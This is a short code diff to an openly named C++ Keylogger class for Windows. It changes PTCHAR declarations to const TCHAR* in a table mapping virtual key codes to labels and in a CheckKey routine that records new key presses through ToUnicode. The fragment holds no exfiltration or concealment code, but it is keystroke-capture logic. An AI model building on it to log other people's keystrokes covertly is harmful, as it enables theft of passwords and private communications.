@@ -6,10 +6,10 @@
 
 Keylogger keylogger;
 
-const PTCHAR X = ((PTCHAR)~0);
+const TCHAR* X = ((PTCHAR)~0);
 
 // http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731%28v=vs.85%29.aspx
-const PTCHAR keyStrings[] =
+const TCHAR* keyStrings[] =
 {
 /* 0 */ 0, 0, 0, 0, 0, 0, 0, 0, _T("[Back]"), _T("[Tab]"), 0, 0, _T("[Clear]"), _T("[Enter]"), 0, 0,
 /* 1 */ _T("[Shift]"), _T("[Ctrl]"), _T("[Alt]"), _T("[Pause]"), _T("[CAPS]"), 0, 0, 0, 0, 0, 0, _T("[Esc]"), 0, 0, 0, 0,
@@ -78,8 +78,8 @@ void Keylogger::CheckKey(short i)
 
 	if (!keyPrev && keysActive[i])
 	{
-		PTCHAR str = keyStrings[i];
-
+		const TCHAR* str = keyStrings[i];
+		
 		if (str == X)
 		{
 			int ret = ToUnicode(i, 0, this->keysActive, keyBuf, sizeof(keyBuf), 0);
